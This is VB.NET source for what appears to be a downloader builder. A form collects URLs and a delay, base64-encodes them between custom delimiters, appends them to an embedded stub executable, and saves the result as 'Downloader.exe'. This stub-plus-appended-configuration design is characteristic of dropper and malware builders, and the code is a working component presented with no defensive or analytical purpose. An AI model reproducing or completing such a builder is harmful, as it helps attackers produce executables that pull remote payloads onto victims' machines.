Imports System.IO
Imports System.Text

Public Class Form1

    Const ProgramDelimiter As String = "\||/"
    Const ParamsDelimiter As String = "|*--*|"
    Const LinksDelimiter As String = "|}{|"

    Dim s As String

    Private Sub TabControl1_Selecting(sender As Object, e As TabControlCancelEventArgs) Handles TabControl1.Selecting

        If e.TabPage.Name = "BuildPage" Then

            e.Cancel = True
            If LinksListBox.Items.Count = 0 Then : MsgBox("Please add atleast one link.", MsgBoxStyle.Critical, "Error")
            Else

                ' Save dialog
                Dim Dialog As New SaveFileDialog
                Dialog.Title = "Save As"
                Dialog.Filter = "Executable Files (*.exe) |*.exe"
                Dialog.FileName = "Downloader.exe"
                If Dialog.ShowDialog = Windows.Forms.DialogResult.OK Then

                    Try

                        ' --- Parameters ---
                        ' Links
                        Dim array1(LinksListBox.Items.Count) As String
                        LinksListBox.Items.CopyTo(array1, 0)

                        ' Delay 
                        Dim delay As Integer = DelayUpDown.Value
                        ' --- ---

                        ' Encoded parameters
                        Dim params = Encoding.Default.GetBytes(ProgramDelimiter + Convert.ToBase64String(Encoding.Default.GetBytes(String.Join(LinksDelimiter, array1) & ParamsDelimiter & delay & ParamsDelimiter)) + ProgramDelimiter)

                        ' Stub
                        Dim stub As Byte() = My.Resources.Stub

                        ' Merge stub and parameters
                        Dim mergedByte(stub.Length + params.Length) As Byte
                        stub.CopyTo(mergedByte, 0)
                        params.CopyTo(mergedByte, stub.Length)

                        ' Write the downloader
                        File.WriteAllBytes(Dialog.FileName, mergedByte)

                        MsgBox("Downloader built:" & Environment.NewLine & Dialog.FileName, MsgBoxStyle.Information, "Downloader built")

                    Catch ex As Exception : MsgBox(ex.ToString)
                    End Try

                End If

            End If

        End If

    End Sub

    Private Sub RemoveLinkButton_Click(sender As Object, e As EventArgs)
        LinksListBox.ClearSelected()
    End Sub

    Private Sub AddLinkButton_Click_1(sender As Object, e As EventArgs) Handles AddLinkButton.Click
        s = InputBox("Please enter a link.", "Add link")
        If s = Nothing Then
            Return
        Else
            LinksListBox.Items.Add(Trim(s))
        End If
    End Sub

    Private Sub RemoveLinkButton_Click_1(sender As Object, e As EventArgs) Handles RemoveLinkButton.Click
        LinksListBox.Items.Remove(LinksListBox.SelectedItem)
    End Sub

    Private Sub RemoveAllLinksButton_Click(sender As Object, e As EventArgs) Handles RemoveAllLinksButton.Click
        LinksListBox.Items.Clear()
    End Sub

End Class
